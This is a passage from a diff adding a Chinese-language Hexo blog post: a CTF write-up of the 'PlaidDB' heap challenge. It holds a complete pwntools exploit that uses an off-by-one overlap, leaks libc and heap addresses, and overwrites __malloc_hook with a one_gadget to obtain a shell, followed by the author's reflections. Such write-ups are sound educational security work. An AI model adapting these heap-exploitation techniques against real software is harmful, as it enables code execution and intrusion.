+<p>不过在PUT里面的malloc触发one_gadget死活不成功，本来以为又要嗝屁了55555，结果在我坚持尝试的努力下，在DEL中成功将one_gadget触发成功</p>
+<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'PlaidDB'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment">#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(key)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Enter command:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">"GET"</span>)</span><br><span class="line">	p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">	p.sendline(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PUT</span><span class="params">(key, size, data)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Enter command:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">"PUT"</span>)</span><br><span class="line">	p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">	p.sendline(key)</span><br><span class="line">	p.recvline(<span class="string">"PROMPT: Enter data size:"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvline(<span class="string">"PROMPT: Enter data:"</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DUMP</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Enter command:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">"DUMP"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DEL</span><span class="params">(key)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Enter command:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">"DEL"</span>)</span><br><span class="line">	p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">	p.sendline(key)</span><br><span class="line"></span><br><span class="line">PUT(<span class="string">"th3fl4g"</span>, <span class="number">0x88</span>, <span class="string">'\x00'</span>*<span class="number">0x88</span>)</span><br><span class="line">PUT(<span class="string">"2222222"</span>, <span class="number">0x38</span>, <span class="string">'\x00'</span>*<span class="number">0x38</span>)</span><br><span class="line">PUT(<span class="string">"2222222"</span>, <span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">0x68</span>)</span><br><span class="line">PUT(<span class="string">"3333333"</span>, <span class="number">0x38</span>, <span class="string">'\x00'</span>*<span class="number">0x38</span>)</span><br><span class="line">PUT(<span class="string">"2222222"</span>, <span class="number">0x58</span>, <span class="string">'\x00'</span>*<span class="number">0x58</span>)</span><br><span class="line">PUT(<span class="string">'4444444'</span>, <span class="number">0x58</span>, <span class="string">'\x00'</span>*<span class="number">0x58</span>)</span><br><span class="line">PUT(<span class="string">'4444444'</span>, <span class="number">0xf8</span>, <span class="string">'\x00'</span>*<span class="number">0xf8</span>)</span><br><span class="line">PUT(<span class="string">'5'</span>*<span class="number">0x10</span>+p64(<span class="number">0x300</span>), <span class="number">0x108</span>, <span class="string">'\x00'</span>*<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">DEL(<span class="string">'2222222'</span>)</span><br><span class="line">DEL(<span class="string">'th3fl4g'</span>)</span><br><span class="line">DEL(<span class="string">'4444444'</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">'brva 0x1334'</span>)</span><br><span class="line">PUT(<span class="string">'a'</span>, <span class="number">0xc8</span>, <span class="string">'\x00'</span>*<span class="number">0xc8</span>)<span class="comment">#D0 chunk</span></span><br><span class="line"></span><br><span class="line">DUMP()</span><br><span class="line"><span class="comment">#p.recvuntil('bytes')</span></span><br><span class="line">p.recvuntil(<span class="string">'['</span>)</span><br><span class="line">heap_base=my_u64(p.recv(<span class="number">6</span>))<span class="number">-0x610</span></span><br><span class="line">p.recvuntil(<span class="string">', '</span>)</span><br><span class="line">libc_base=int(p.recvuntil(<span class="string">' '</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + hex(heap_base)+<span class="string">','</span>+hex(libc_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line">fill1=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x180</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x390</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(libc_base+<span class="number">0x3c4aed</span>)+p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">PUT(<span class="string">'b'</span>,<span class="number">0xa8</span>,fill1)</span><br><span class="line"></span><br><span class="line">PUT(<span class="string">'c'</span>,<span class="number">0x68</span>,<span class="string">'no mean'</span>.ljust(<span class="number">0x48</span>,<span class="string">'\x00'</span>)+p64(<span class="number">0x200</span>)+p64(libc_base+<span class="number">0x3c4b78</span>)*<span class="number">2</span>+<span class="string">'\x00'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">DEL(<span class="string">'b'</span>)</span><br><span class="line"><span class="comment">### Write different one_gadget</span></span><br><span class="line"><span class="comment">#PUT('never',0x68,'\x00'*19+p64(libc_base+0x45216)+'\x00'*77)</span></span><br><span class="line">PUT(<span class="string">'gogogo'</span>,<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">19</span>+p64(libc_base+<span class="number">0x4526a</span>)+<span class="string">'\x00'</span>*<span class="number">77</span>)</span><br><span class="line"><span class="comment">#PUT('never',0x68,'\x00'*19+p64(libc_base+0xf02a4)+'\x00'*77)</span></span><br><span class="line"><span class="comment">#PUT('never',0x68,'\x00'*19+p64(libc_base+0xf1147)+'\x00'*77)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># try try try</span></span><br><span class="line">DEL(<span class="string">'gogogo'</span>)</span><br><span class="line"><span class="comment">#GET('')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h1><p>这个堆题应该是目前为止写的时间最长，也是最麻烦的一个堆题，主要是树形结构的逆向很耗时间，然后再off_by_one的构造上也要花不少功夫，合并的内存块前面必须要满足unlink条件，这个就需要精力去考虑一下在这种复杂堆管理下的构造方式，再就是一定要清楚各个模块对chunk操作的顺序，否贼写起来真的毫无头绪。再就是这个leak的方式也是我第一次见，通过unsortedbin指针，既打印了libc的地址又打印了堆的地址，承认这个操作是看师傅们的wp来的，以后一定在leak方面加把劲XD。最后就是玄学树操作，比赛碰到这种一定要不求甚解，只要能不影响漏洞利用就可以了，要不然浪费大量时间。<br>另外这题师傅们的构造更好一点，师傅们的构造是这样的，0x90加到0x100 chunk之前刚好是0x200的一个chunk</p>
+<table>
+<thead>
+<tr>
+<th>node A</th>
+<th>dataB</th>
+<th>rkB</th>
+<th>rkA</th>
+<th>dataA</th>
+<th>nodeB</th>
+<th>nodeC</th>
+<th>rkC</th>
+<th></th>
+<th>nodeD</th>
+<th>rkd(exp)</th>
+<th>dataC_n</th>
+<th>dataD</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x40</td>
+<td>0x20</td>
+<td>0x20</td>
+<td>0x20</td>
+<td>0x90</td>
+<td>0x40</td>
+<td>0x40</td>
+<td>0x20</td>
+<td>0x70</td>
+<td>0x40</td>
+<td>0x20</td>
+<td>0x100</td>
+<td>0x20</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>fastbin1</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>最后：多撸源码</strong></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/how2heap/" rel="tag"># how2heap</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/02/06/how2heap-house-of-spirit-OREO/" rel="prev" title="how2heap - house_of_spirit&OREO">
+      <i class="fa fa-chevron-left"></i> how2heap - house_of_spirit&OREO
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/" rel="next" title="how2heap - overlapping_chunks&bookstore,night-deamonic-heap">
+      how2heap - overlapping_chunks&bookstore,night-deamonic-heap <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#how2heap-poison-null-byte-amp-plaiddb"><span class="nav-number">1.</span> <span class="nav-text">how2heap - poison_null_byte&amp;plaiddb</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#poison-null-byte-c"><span class="nav-number">2.</span> <span class="nav-text">poison_null_byte.c</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#debug"><span class="nav-number">2.1.</span> <span class="nav-text">debug</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#binmap-amp-一些流程"><span class="nav-number">2.2.</span> <span class="nav-text">binmap&amp;一些流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#plaiddb"><span class="nav-number">3.</span> <span class="nav-text">plaiddb</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#程序分析"><span class="nav-number">3.1.</span> <span class="nav-text">程序分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PUT"><span class="nav-number">3.1.1.</span> <span class="nav-text">PUT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DUMP"><span class="nav-number">3.1.2.</span> <span class="nav-text">DUMP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GET"><span class="nav-number">3.1.3.</span> <span class="nav-text">GET</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DEL"><span class="nav-number">3.1.4.</span> <span class="nav-text">DEL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#off-by-one"><span class="nav-number">3.1.5.</span> <span class="nav-text">off_by_one</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">3.2.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#各处的malloc（初始化之后的）"><span class="nav-number">3.2.1.</span> <span class="nav-text">各处的malloc（初始化之后的）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#各处的free"><span class="nav-number">3.2.2.</span> <span class="nav-text">各处的free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第一思路："><span class="nav-number">3.2.3.</span> <span class="nav-text">第一思路：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二思路："><span class="nav-number">3.2.4.</span> <span class="nav-text">第二思路：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整EXP"><span class="nav-number">3.3.</span> <span class="nav-text">完整EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#小记"><span class="nav-number">4.</span> <span class="nav-text">小记</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.0
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
